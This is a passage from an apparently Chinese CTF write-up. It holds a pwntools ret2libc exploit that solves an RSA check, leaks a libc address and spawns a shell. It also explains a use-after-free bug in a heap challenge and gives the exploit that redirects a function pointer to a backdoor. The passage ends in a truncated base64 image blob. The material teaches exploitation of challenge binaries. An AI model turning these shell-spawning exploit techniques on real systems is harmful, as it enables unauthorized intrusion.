pop_rdi_addr = 0x40095a
vlun_addr = 0x40093a

N = 94576960329497431
p = 261571747
q = 361571773
phi = (p-1)*(q-1)
d = 26375682325297625

def powmod(a, b, m):
	if a == 0:
		return 0
	if b == 0:
		return 1
	res = powmod(a,b//2,m)
	res *= res
	res %= m
	if b&1:
		res *= a
		res %= m
	return res

def ans(sh):
	sh.recvuntil("it\n")
	for _ in range(20):
		c = int(sh.recvline())
		m = powmod(c, d, N)
		sh.sendline(str(m))
		sh.recvline()

def leak(sh, addr, presize):
	sh.recvuntil("name:\n")
	payload = flat(b'a' * presize, p64(pop_rdi_addr), p64(addr), p64(elf.plt['puts']), p64(vlun_addr))
	sh.sendline(payload)
	leaked = sh.recvuntil('\n')[:-1]
	while len(leaked) < 8:
		leaked += b'\x00'
	return u64(leaked)

sh = remote('127.0.0.1', '8888')
ans(sh)
libc_main_addr = leak(sh, elf.got['__libc_start_main'], 72)
print("WE GOT LIBC_MAIN_ADDR")
print(hex(libc_main_addr))

obj = LibcSearcher("__libc_start_main", libc_main_addr)
libc_main_offset = obj.dump('__libc_start_main')
system_offset = obj.dump('system')
sh_offset = obj.dump('str_bin_sh')

base_addr = libc_main_addr - libc_main_offset
system_addr = system_offset + base_addr
sh_addr = sh_offset + base_addr

payload = flat(b'a' * 72, p64(pop_rdi_addr), p64(sh_addr), p64(system_addr))
sh.sendline(payload)

sh.interactive()
```


## 0x08 YDSneedGirlfriend

本次比赛的唯一一道堆题,改编自hitcon training的uaf,这道题是我当初学习pwn堆题的第一题,非常简单,因此出本题是希望18,19级同学能有所收获,没想到本校没人做出QAQ

**考点:uaf**

漏洞位置:

```
unsigned __int64 del_girlfriend()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, &buf, 4uLL);
  v1 = atoi(&buf);
  if ( v1 >= 0 && v1 < count )
  {
    if ( girlfriendlist[v1] )
    {
      free(*((void **)girlfriendlist[v1] + 1));
      free(girlfriendlist[v1]);
      puts("Success");
    }
  }
  else
  {
    puts("Out of bound!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

可以看到我们在free一个chunk的时候并未给这个chunk置NULL,从而导致UAF漏洞的发生

通过逆向可以看出girlfriend结构体为:

```
struct girlfriend {
	void (*func)();
	char *buf ;
};
```

func的作用就是打印名字

并且程序给出了后门函数backdoor,我们只需要利用uaf漏洞将func原本指向的函数指向backdoor函数,之后调用即可

payload如下:

```
from pwn import *

p=process('./girlfriend2')
#p=remote('222.186.56.247',8131)
elf=ELF('./girlfriend')

#context.terminal=['tmux','splitw','w']
backdoor=elf.symbols['backdoor']
sys=elf.symbols['system']

def add(size,name):
    p.recvuntil(':')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(str(size))
    p.recvuntil(':')
    p.sendline(name)

def dele(index):
    p.recvuntil(':')
    p.sendline('2')
    p.recvuntil(':')
    p.sendline(str(index))

def prin(index):
    p.recvuntil(':')
    p.sendline('3')
    p.recvuntil(':')
    p.sendline(str(index))

add(32,'aaa')
add(32,'bbb')
add(32,'ccc')

dele(0)
dele(1)

add(24,p64(backdoor))

prin(0)
p.interactive()
```



[modtogether]:data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wgARCAEPAioDASIAAhEBAxEB/8QAGgABAAMBAQEAAAAAAAAAAAAAAAMEBQIBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/2gAMAwEAAhADEAAAAfs69Xk0+acZf4zPDU8y4E+vhmqc5LNSu2BvYAAAAAAAAAAAAAAAAAAAAAAAAAAAFavojO50xndXxR50ABHISBaAAAAAAAAAAAAAAAAAAAAAAAAAAAAYnhuPktk0/c/FT6pgSrtPm7Jt+ZlKPoXzlitthQp9F7h3Vvsy8SvmtJNNmWVtGdGiwqZ9S+eqWfWMUu0+W3ktny6/UMSM32F6bj5TVNX3A0C+xtkKmGfTsga7FjN7z5yybbOvnQAAAAAAMzrRFfuVEHFpVK6FDu4M6S6KvF0VeLore2BW4uCp5cFeC+Io7IpSWRUq6ogr3xQ50Qo3hTXBn+aIo92xWklFKxKOKd8VVoUurYoy2RWn6AAAAAAAAAAAAAAAAAAAAAAAA5OgAHg9c+noAAAAAAAAAAAAAAAAAAAAAAAAAAFW1CQ2qN8qT8SmT3c7OINGoUepZTO1YZzA+mhnAAAAAAAAAAAAAAAAAAAAAAAAAAABnmgxdYkZdss1cW+X5oMmN18pPW3N87rkOliboAAAAAAAAAAAAAAAAAAAAAAAAAAABWsgAAAAAAAAAAAAAAAAAAAAQCdV7J0ERcVfSyqdlgBV7JwFfslKxZV/CyrelhSlLClOTIIy2qRl85OlSQnVuS2qeFxB4WFTssKcRoqwsqotIJj0A8PQADw9QTgBWsgGNFs+x8/b2OKxan0nh85F9SMK9ckMjRtQHz+no+mNb0KxmWbw7xtrw+ct64xZdbwwpNlHx27oqw4PpOzIavZDFZ6MCt9L6cfKfYcnzM270lTN+g4X5e7s9mDlfZemF5v8mP1rdGBdvSmJY1ICTP0/Cnk/RjG1YrJmaPQxq/0I+Y7+kHz13UJl6guJ314la9zclq5H0GPXkvnZo+dSxj6dC1UlrOvlGCaEhu1rZV5scjSztE6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM40UNM0kcJaRwFtneGkrCyxdAtK4sIaRpovSQAAAAAAAAAAAAAAAAAAAAAAAAFWvpQxU40q9ndTSLRp7Qj969MjrVCKXwzs76MYTdFHy+AAAAAAAAAAAAAAAAAAAAAAAAAAAI4uqhfhhplqK/OV61/oyetSI9ihz42oc+M2EWdZuhQAAAAAAAAAAAAAAAAAAAAAAAAACvUNNQom6hxzeYg15Mqsbzz0AAAAAAAAAAAAAAAAAAAAAAAAAAAAA4hsjiOccVboqSTiHmwAAAAAAAAAAAAAAAAP//EACsQAAMAAQQBAwMEAgMAAAAAAAECAwQAERITFBAiUAUwMSEjNHBAYCAkgP/aAAgBAQABBQLyp9s/qGO60yoy1LMjVWytmnmdoOaBpcwl9UoslSgp85V5Pmw99H731LvSFV5vIc8iiNzgEa+rx7liOPzjRUr4UQHw0d1wlU+GgAxJiXiSGlxeB9Aux/oX8/c3H+V+ft7j/Bo/u39gPu99IQ3VFYHSUIkN569xebspXlwsxOTHYU5KUs7sgY8chGWsKM1FyjSiUWmqvxzpbrdskmy5CPTWWdlUjvc/uRfjFWpyuB3y23CkjG2MNNSnCK9mkUO9gUePJchOZX9WxItSU72edBl09MncQBc1abpLHQa3DC1HePI9eTNucaO1F5cfvPil6Li7TaIYBAJLPjDpACQ4tpcYq4i2vF9tsZbEyJp4/saO+vGGyy2M5dZEEUwR0YwHJMfhTpTkk6eRNSqUl2EwYlYTUCG2vCHFkcnxjrxQT4vp4kuwRbfxp6OKHPiJ2HG9xxwSY8qGatTxZcQpFHXmhx2OukECAQ9B4mAK+MOIls6R4lRxX+uywX/juN/xrku35+YvbpRaldMdl7n0zETTLq+kHlrPkKUtRcmeaTrzeKcmpl3O0ERYsBsPl6TWorFtiAR0R0UDIMeYMpLFNPjq9lwpppcWa6GIgasu3RkjV+erbrZaq7erW4XY8UTMFMUbkfL5ZcTYtFG3M+NNU/jzm2+GvPFSfF78PPjRtA24IV78qirFpMn1D5mkVqf61ayLo2mNeRHc2monadR5UeZyJCQyJknIUPKwsvp3oHS06H0NkDK/I6peciLIW7l0l5uO5ONMqctC820uXBlFUYrZGHkx28mOwzIk6Zgi+TPcWQ6XIk7jJmR5MteVEFrIrd0+nyZjTXmoTKi7eZPgLzOhkSLvkSmBkTKGqA/n7ROwlVLL6mwGR62TnRWIWh4lyusc7TZHrS3LxYkFlZhXCUrNN6UhQ0FZt3zdXy/1pSFKtWm3kw2FlYOuZy7YcFyUm/JGCxrVAzKveu7RHET2HbDbiqsTPj1TqTVao75X8Xg/kkDgqqie7b9etePJPflqwf6eULUdTqYIyPdqDcYTrvXJXkjkdLBezIJP0+qUgocxRuWyd3dlMVgGtxZ6xi+/D9zW+y/T2UpkFfMSrBi9eCFPMyQzXwm5LrrmdKiKdttGaHQmgPVPXWnHrTbpn2cF56nJZaKqdcRvqUFlozQ6E0GgAoKg64rplVwFVQFVRwXRRW11T26p7CUweIOlmiaI3ARQxAOmmj6CKNEbjioPVPXWgXbbXWmuqegqjQRFYIoXiuutNmRWJUHXTLX4GqSWvpsN/SkFq32zk1D91F0L5BPczSShSc8vJYUy6HGXIr2WusB2c4Y161SFDSMrpY6tZlpj5DlTksRR6bdlS1sioONWjFTuvyCQoLeOz6bDTSoVx0ntjNgu+nxX4iNuVZdpdOxJ4zy1KTriyx/H0u/Gkna88eiFcWon0tTXSRXxfdjwMyu/H/w3TI31y65+QXyHdUAyJkvRZr5MdMbGs6uEa8kPfM6WuTslGNHvNGW8nYVRmfJ/7L0SYWiv8nkTauMSYRebtk9jyeoYqJ25ZUjaNcejaQEIyq2qQoaJjtPI0JorVShzJY9lUYtTJY2XWTE2EZ0W3ydZiswNlMd7f6M7qg8iRLOqDyI6dj288hdJQvrsoMZK2ZjRnk7rNfIjpqIur2E5SfnAWkx+WrzKhb8suRtCuPRiibDQUD1EkGsxGpiUlVnWNUKYtYpFT4iY1VHzv40jrRfnakhQ1OWXR5QpeyHcmMr3fUcqltSyntX6f/DOTcD8/OMiuPHiCyK4MZsOC8BiQXQxoqnTPaUkiphIr/s3/8QAHBEAAQMFAAAAAAAAAAAAAAAAAQIRIQAgMWCA/9oACAEDAQE/AbFO0Ugkie+hjVP/xAAfEQABAwMFAAAAAAAAAAAAAAABAAJBA2BwEiAhMDH/2gAIAQIBAT8B2VC4NOj1MJLebIGcZ65xqVNqf//EAEUQAAEDAwIDBAYFCAgHAAAAAAEAAhEDEiEiMTJBURMjYXEEEDNQgZFCUnKhwSAwcJKisdHhFEBDU2Bik/BEVICCwuLx/9oACAEBAAY/Auz1XfZKBNQNnkU4Go24ckzW25w4ZTx2bzYYJwmltJ8HxH8U/uqkt8FBouGuyZG/qlywD78fSNW2+mG4Od1T9G/5c6v/ABVdorM0b93/ADXo/fMhwAHd+HmnGJH9I8Pq+KokNiHne0bY5L0lr64OW4Ld1jsxFacUz6gAYIQHQe/HBnd3blm6bZLHN+k05T3X1W372uVM9pVIZsC7CEOcHCYd4nmmsMm1113OV3fdn6zd0SK1XJk5/Qrv/Wsfm9/6i5pvDbwDmfkqobw3DDpwm6xlzt7tvmmiLKdsnOT4Jtje5cJA+qqUup5JmapQhxg1SNGrCHZur5fm5uP3LQX3vLwZ2KPY3PFgta47Lu3l76bszs/qidYmmeRwqFnZOdacMwdlUvNTtOIkNOlUnubzjEkGeaDb5H/umw/JdcQGdE8F4e0AEGERTbLQ+3+JRtOxgqpthmDBwUwXuINOTJ8k+nTbNkT4lWDfl4+qnkRfzdCpWmnxfRqE8kcgAB31v4p2puw1XEJ2XMa525ccqnc5rDbmSYVa0tNreJpKp234IB+XmgRt5R6nS50Hq/8Az/cqzWvjaLHymhjqgq/2urZbbubBDifuTQZMh27SIV5q1LiOqpVXvi1t0kKky/MgFpb1VJrGg3mMrhb7Xs/P1GDB80Y7UO4ck9Ux731NPHq5IupueaTeAXYKqCp2naHOlp09FSeRz5TDkW3kjPX6wQh+XuGA3kMpwvDxYCDEIXRdzj8+89obam4RpOddT3zujGknEwuzG0QhTDtmxKphp
